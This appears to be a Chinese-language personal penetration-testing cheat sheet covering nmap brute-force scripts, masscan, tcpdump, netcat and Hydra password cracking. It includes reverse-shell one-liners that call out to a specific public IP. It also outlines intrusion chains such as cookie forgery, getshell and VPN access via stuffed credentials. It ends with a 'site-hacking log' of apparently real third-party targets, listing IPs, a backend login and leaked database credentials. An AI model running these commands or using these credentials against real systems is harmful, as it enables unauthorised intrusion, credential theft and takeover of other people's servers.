nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.104

8. 检查 msSQL空密码
nmap -p 1433 --script ms-sql-empty-password 192.168.1.104

9. 读取 msSQL 数据
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.101

10. 读取 msSQL 执行系统命令
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="ipconfig" 192.168.1.101

11. 审计 PgSQL 密码
nmap -p 5432 --script pgsql-brute 192.168.1.101
123456789101112131415161718192021222324252627282930313233343536
```

#### 八、渗透测试

```shell
1. 审计 HTTP 身份验证
nmap --script=http-brute -p 80 www.pcos.cn

2. 审计 FTP 服务器
nmap --script ftp-brute -p 21 192.168.1.101
nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101
nmap --script=ftp-anon 192.168.1.101

3. 审计 Wordpress 程序
nmap -p80 --script http-wordpress-brute 192.168.1.110
nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110
nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.110

4. 审计 Joomla 程序
nmap -p80 --script http-joomla-brute 192.168.1.110
nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110
nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.110

5. 审计 邮件服务器 
nmap -p110 --script=pop3-brute 192.168.1.110

6. 审计 SMB 口令
nmap --script smb-brute.nse -p 445 192.168.1.110
nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.110

7. 审计 VNC 服务
nmap --script vnc-brute -p 5900 192.168.1.110

8. 审计 SMTP 服务器
nmap -p 25 --script smtp-brute 192.168.1.110
nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)

9. 检测 Stuxnet 蠕虫
nmap --script stuxnet-detect -p 445 192.168.1.110

10. SNMP 服务安全审计
nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)
nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)
nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)
nmap -sU -p 161 --script snmp-brute 192.168.1.110
12345678910111213141516171819202122232425262728293031323334353637383940
```

#### 九、Zenmap

```shell
1. Intense scan (详细扫描)
nmap -T4 -A -v 192.168.1.101

2. Intense scan plus UDP (UDP扫描经典使用)
nmap -sS -sU -T4 -A -v 192.168.1.101

3. Intense scan, all TCP ports (TCP扫描)
nmap -p 1-65535 -T4 -A -v 192.168.1.101

4. Intense scan, no ping (无Ping扫描)
nmap -T4 -A -v -Pn 192.168.1.101

5. Ping scan (Ping扫描)
nmap -sn 192.168.1.101/24

6. Quick scan
nmap -T4 -F 192.168.1.101/24

7. Quick scan plus
nmap -sV -T4 -O -F --version-light 192.168.1.101/24

8. Quick traceroute
nmap -sn --traceroute 192.168.1.101

9. Regular scan 
nmap 192.168.1.101

10. Slow comprehensive scan
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 192.168.1.101
1234567891011121314151617181920212223242526272829
```

#### 十. Nmap 技巧

```shell
1. 发送以太网数据包
nmap --send-eth 192.168.1.111

2. 网络层发送
nmap --send-ip 192.168.1.111

3. 假定拥有所有权
nmap --privileged 192.168.1.111

4. 在交互模式中启动
nmap --interactive

5. 查看 Nmap 版本号
nmap -V

6. 设置调试级别
nmap -d (1-9) 192.168.1.111

7. 跟踪发送接收的报文
nmap --packet-trace -p 20-30 192.168.1.111

8. 列举接口和路由
nmap --iflist www.iteye.com

9. 指定网络接口
nmap -e eth0 192.168.1.111

10. 继续中断扫描
nmap -oG 1.txt -v 192.168.126.1/24
nmap --resume 1.txt (继续扫描)

11. Dnmap
dnmap_server -f test (指定命令脚本)
dnmap_client -s 192.168.1.107 -a test

12. 编写 Nse 脚本

(1)    -- The scanning module --
    author = "Wing"
    categories = {"version"}

    portrule = function(host,port)
    return port.protocol == "tcp" and port.number == 80 and port.state == "open"
    end

    action = function(host,port)
    return "Found!!!"
    end

(2) -- The scanning module --
    author = "Wing"
    categories = {"version"}

    local comm=require "comm"
    require "shortport"
    local http=require "http"

    portrule = function(host,port)
    return (port.number == 80) and (port.start=="open")
    end

    action = function(host,port)
    local uri = "/admin.php"
    local response = http.get(host,port,uri)
    return "Found!!!"
    end

13. 探测防火墙
nmap --script=firewalk --traceroute 192.168.1.111

14. VMware认证破解
nmap -p 902 --script vmauthd-brute 192.168.1.107
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172
```

#### 十一. Nmap的保存和输出

```shell
1. 标准保存
nmap -F -oN d:/test1.txt 192.168.1.111

2. XML保存
nmap -F -oX d:/test1.xml 192.168.1.111

3. 133t 保存
nmap -F -oS d:/test2.txt 192.168.1.111

4. Grep 保存
nmap -F -oG d:/test2.txt 192.168.1.111

5. 保存到所有格式
nmap -F -oA d:/test2 192.168.1.111

6. 补充保存文件
nmap -F -append-output -oN d:/test2.txt 192.168.1.111

7. 转换 XML 保存
nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.111

8. 忽略 XML 声明的 XSL 样式表
nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111
```

常用指令：

```shell
nmap -sP 192.168.1.100        # 查看一个主机是否在线

nmap 192.168.1.100            # 查看一个主机上开放的端口

nmap -sV -O 192.168.0.100  	  # 判断目标操作系统类型

nmap -sS 192.168.1.100        # 半开放syn扫描

nmap -p 1-1000 192.168.1.100  # 扫描指定端口范围

nmap -p 80 192.168.1.100      # 扫描特定端口

nmap -sV 192.168.1.100  	  # 查看目标开放端口对应的协议及版本信息

# 判断防火墙的扫描
nmap -sF IP
nmap -sA IP
nmap -sW IP //ACK,探测防火墙扫描
```

>   其他参数
>   -sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到
>   -Pn 跳过Ping测试(防火墙)，扫描指定目标
>   -v 详细模式V越多就越详细
>   -p 80 ping指定端口
>   --script=script_name 使用脚本
>   [脚本列表](http://nmap.org/nsedoc/scripts/)

**nmap脚本扫描：分类：**

>   auth: 负责处理鉴权证书（绕开鉴权）的脚本

>   broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务

>   brute: 提供暴力破解方式，针对常见的应用如http/snmp等

>   default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力

>   discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等

>   dos: 用于进行拒绝服务攻击

>   exploit: 利用已知的漏洞入侵系统

>   external: 利用第三方的数据库或资源，例如进行whois解析

>   fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽

>   malware: 探测目标机是否感染了病毒、开启了后门等信息

>   safe: 此类与intrusive相反，属于安全性脚本

>   version: 负责增强服务与版本扫描（Version Detection）功能的脚本

>   vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067

使用实例：

```shell
nmap --script=auth IP  
//负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令
http-php-version     //获得PHP版本信息
Http-enum               //枚举Web站点目录
smtp-strangeport   //判断SMTP是否运行在默认端口
dns-blacklist         //发现IP地址黑名单
```

------

```shell
nmap --script=vuln 192.168.137.* //扫描常见漏洞
smb-check-vulns  //检测smb漏洞
samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞
```

------

扫描wordpress应用的脚本

```
1.http-wordpress-plugins
2.http-wordpress-enum
3.http-wordpress-brute
```

测试WAF是否存在

```shell
nmap -p 80,443 --script=http-waf-detect 192.168.0.100
nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
```

### masscan

**单端口扫描**

扫描443端口的B类子网

```shell
$ Masscan 10.11.0.0/16 -p443
```

**多端口扫描**

扫描80或443端口的B类子网

```shell
$ Masscan 10.11.0.0/16 -p80,443
```

**扫描一系列端口**

扫描22到25端口的B类子网

```shell
$ Masscan 10.11.0.0/16 -p22-25
```

**快速扫描**

使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。

默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。

扫描100个常见端口的B类子网，每秒100,000个数据包

```shell
$ Masscan 10.11.0.0/16  --top-ports 100 -rate 100000
```

你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。

**排除目标**

因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。

扫描B类子网，但避免在exclude.txt中的

```shell
$ Masscan 10.11.0.0/16  --top-ports 100 --excludefile exclude.txt
```

**结果保存**

您可以使用标准的Unix重定向器将输出发送到文件：

```shell
$ Masscan 10.11.0.0/16  --top-ports 100 > results.txt
```

 除此之外，您还具有以下输出选项：

```shell
-oX filename：输出到filename的XML。
-oG filename：输出到filename在的grepable格式。
-oJ filename：输出到filename在JSON格式。
```

**Nmap功能**

正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：

通过传递–nmap开关可以看到类似nmap的功能。

```shell
-iL filename：从文件读取输入。
‐‐exclude filename：在命令行中排除网络。
‐‐excludefile：从文件中排除网络。
-S：欺骗源IP。
-v interface：详细输出。
-vv interface：非常冗长的输出。
-e interface：使用指定的接口。
-e interface：使用指定的接口。
```

**快速开始**

![Masscan教程和入门手册](http://img.4hou.com/wp-content/uploads/2017/10/194a4d0429fc0faa4b54.png)

 好的，这里有一些快速和功能的扫描示例，您可以开始，然后调整您的口味和要求。

 我们假设你想快速扫描。

 扫描web端口的网络

```shell
$ masscan 10.11.0.0/16 -p80,443,8080 - 达 1000000
```

 扫描十大端口的网络

```shell
$ masscan 10.11.0.0/16 - top-ten- rate 1000000
```

 扫描所有端口的网络

```shell
$ masscan 10.11.0.0/16 -p0-65535 - rate 1000000
```

 扫描一个端口的互联网

 我们将速度提高到每秒1000万，这将最大限度地延伸。

```shell
$ masscan 0.0.0.0/0 -p443 - rate 10000000
```

 扫描所有端口的互联网

 一般来说，如果您尝试这种情况，您应该预期会发生坏的和/或惊人的事情。

```shell
$ masscan 0.0.0.0/0 -p0-65535 -rate 10000000
```

### AWVS

### Maltego

### Social-Engineer Toolkit

### Metasploit

### Tcpdump

**常用参数**

```shell
-i eth0  # 设置抓取的网卡名（-i any 抓取所有网卡）
-D  # 列出可用的网卡列表
-w file  # 将数据包写入文件中
-c count  # 需要抓取的数据包数量，若未指定，则持续监听
-C size  # 单个文件的最大大小，配合 -w 使用，超出则重新创文件，单位为 MB
-r file  # 从文件包中读取包数据
-A  # 以 ASCII 码解析数据包并显示到屏幕上，通常用来抓取网页流量
-e  # 打印数据链路层的头信息，比如 MAC
-v  # 抓包时输出包的附加信息，v 越多越详细（与 nc 类似）
-x  # 打印每个包的头部信息，同时以 16 进制打印每个包的数据
-q	# 简单列出协议信息
-S  # 打印 TCP 数据包的顺序号（绝对顺序）
-n  # 直接显示 ip 不进行反向解析为域名
-nn # 直接显示协议和端口号，不要转换为协议名称

sudo tcpdump -i eth0 -nnS -s 0 -c 100 -Avvv [<expression>]
sudo tcpdump -i eth0 -nnS -s 1024 -c 100 -Avvv [<expression>]
sudo tcpdump -i eth0 -nnS -s 1024 -C 10 -c 10000 -v -w debug.cap [<expression>]
```

**常用过滤**

```shell
# 修饰符
type  # 对象类型，可以是名字或者数字：host, net, port, port range
dir  # 流量传输方向：src, dst, src or dst, src and dst
proto  # 协议：ether, fddi, tr, wlan, ip, ip6, arp, rarp, decnet, tcp, upd

# 逻辑连接符
! \ not
&& \ and
|| \ or

sudo tcpdump host 192.168.8.3 -Avv
sudo tcpdump dst host baidu.com and dst port 80 -i eth0 -vv
sudo tcpdump dst host baidu.com and not dst port 80 -i eth0 -vv
sudo tcpdump dst host baidu.com and not \(dst port 80 or dst port 443\) -i en0 -vv
sudo tcpdump dst host baidu.com and 'tcp[tcpflags] & (tcp-syn) != 0'
```



### Wireshark

**常用过滤**

```shell
# 追踪 TCP 流
tcp.stream eq 1
tcp contains "xxx"
http contains "<?php"
```



### Netcat

**主要参数** 某些版本的部分参数被阉割

```
options:
	-d              无命令行界面,使用后台模式
	-e prog_name    程序重定向 [危险!!]
	-g gateway      源路由跳跃点, 不超过8
	-G num          源路由指示器: 4, 8, 12, ...
	-h              获取帮助信息
	-i secs         延时设置,端口扫描时使用
	-l              监听入站信息
	-L              监听知道NetCat被结束(可断开重连)
	-n              以数字形式表示的IP地址
	-o file         使进制记录
	-p port         打开本地端口
	-r              随机本地和远程的端口
	-s addr         本地源地址
	-t              以TELNET的形式应答入站请求
	-u              UDP 模式
	-v              显示详细信息 [使用=vv获取更详细的信息]
	-w secs         连接超时设置
	-z              I/O 模式 [扫描时使用]
	端口号可以是单个的或者存在一个范围: m-n [包含值]。
```

监听端口

```shell
nc -l -p 8080 -vvv  # 加 k 则是持续监听
```

靶机反弹 `bash`

```shell
bash -i >& /dev/tcp/47.101.220.241/8004 0>&1
bash%20-i%20>%26%20%2fdev%2ftcp%2f47.101.220.241%2f8008%2f0>%261
```

反向连接

```shell
# 拥有公网 ip 的机子
nc -lvvvp 9988

# victim
nc -te /bin/bash 47.101.220.241 9988
```

web 服务器

```shell
nc -l -p 80 < index.html
while true; do nc -l -p 80 -q 1 < somepage.html; done
# 需要根据 nc 的版本来使用, 访问 localhost 会出现 index.html 页面的内容
```

文件传输

```shell
# 将 s1 mp4 发给 s2
# s2
nc -l -p 1023 -vv > good.mp4
# s1
nc -w 1 ip 1023 < good.mp4
```

端口扫描

```shell
# port [1, 1000]
nc -v -w 2 ip -z 1-1000
# ip 换成 localhost 即可扫自己
```

### Hydra

爆破利器

**用法：**

```
hydra <参数> <IP地址> <服务名>  

-R 继续从上一次的进度开始爆破  
-s <port> 指定端口  
-l <username> 指定登录的用户名  
-L <username-list> 指定用户名字典  
-p <password> 指定密码  
-t <number> 设置线程数  
-P <passwd-list> 指定密码字典  
-v 显示详细过程  
```

实例

```shell
1、破解ssh： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh

2、破解ftp： 
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 

3、get方式提交，破解web登录： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

4、post方式提交，破解web登录： 
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password" 
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>" 
（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） 

5、破解https： 
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 

6、破解teamspeak： 
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 

7、破解cisco： 
hydra -P pass.txt 10.36.16.18 cisco 
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 

8、破解smb： 
hydra -l administrator -P pass.txt 10.36.16.18 smb 

9、破解pop3： 
hydra -l muts -P pass.txt my.pop3.mail pop3 

10、破解rdp： 
hydra ip rdp -l administrator -P pass.txt -V 

11、破解http-proxy： 
hydra -l admin -P pass.txt http-proxy://10.36.16.18 

12、破解imap： 
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```

## 渗透思路

+   信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)
+   主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP
+   入手二级域名，挨个排查，二级域名的个数差不多能有40个
+   根据二级域名的名字选择 upload edit 等等这种具有操作功能的站点入手
+   edit网站存在svn泄露，但是是最原始wc.db的形式，利用 sqlite 把源码还原出来
+   进行代码审计，快速定位代码，全文搜索 exec, upload 等等危险操作
+   审计到一个 exec 命令执行，发现需要用管理员权限
+   回溯代码，定位管理员登陆功能，审计处 cookie 算法可破解
+   伪造 cookie 反弹 shell，上去以后发现很多站点都在上面，权限不够
+   查看一下版本 (2.6.18-194.11.3.el5)
+   利用之前 ctf 中的一个一句话提权成功，然后大杀四方

---

+   成功登陆后台 -> getshell
+   getshell 失败 -> 转换思路 -> 挖掘其他漏洞 (sqlinjection) -> 列库收集用户信息(外网撕出扣子网内网钻)
+   用户名密码 -> 撞邮箱 -> 在邮箱中搜索关键信息 -> 拿到VPN
+   通过 VPN 访问文件服务器 -> 写脚本 getshell

---

+   xss -> 打到后台 -> 403 -> ajax 抓取页面回转出来 -> sql 注入 -> getflag

+   Bypass Waf 注入 (%00,||,seselectlect等等) 国内CTF Web常见题型

+   代码审计 花式杂耍PHP各种特性(反序列化，弱类型等等)

+   文件上传 花式 Bypass 上传(.php111 .inc .phtml .phpt)

+   各种当前热点漏洞

    扫描路径 -> phpinfo -> php7 -> php7apachce -> 查看文档 -> 花式绕坑 -> getshell

+   社会工程学(常用密码等等)

+   各种Web漏洞夹杂

+   具有内网环境的真是渗透场景 





## 日站记录

http://2nto4x.ijhz.cn/luodi/xiaoshuo/?pageid=20%20and%201=0

https://market.hzhangmeng.com/landingPage/register-keledai.html?owner=keledai&channelCode=azuo    

后台http://139.196.127.175:8090/login.html  账号密码一样 azuo



### 信息收集

+ IP：154.80.253.139
+ 可能域名：0539y.com
+ Server: Microsoft-IIS/10.0
+ X-Powered-By: ASP.NET

+ nmap 扫描

```shell
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
3306/tcp open  mysql
Device type: general purpose
Running: Linux 2.4.X, Microsoft Windows XP|7|2012
OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
OS details: DD-WRT v24-sp2 (Linux 2.4.37), Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
```

+ Nikto 扫描

```shell
nikto -h http://example.com -output ~/nikto.html -Format htm
# 结果
http://154.80.253.139/phpMyAdmin/index.php
http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上
http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现
```

+ 信息收集网站

```shell
https://dnslytics.com/ip/154.80.253.139

# 旁站
bjshuxue.com	
'dbuser' => 'user_bjshuxue',
'dbpw' => 'cdma2008'
ftp://154.80.253.139/  # 需要密码连接

pinkewang.com
# 数据库信息
[INFO] the back-end DBMS is Microsoft Access
web server operating system: Windows 10 or 2016
web application technology: ASP.NET, Microsoft IIS 10.0, ASP
back-end DBMS: Microsoft Access

i03.net	
tzsiss.com.cn	
cz-huatian.com	
nplxs.com	
wangmin.name	
4006080.com	
flyemail.cn	
zj5156.org

# 邮箱 2018-08-05
mail.jianuo2.xyz
mail.taiyangyy.top
```

+ 目录扫描

```shell
http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
```
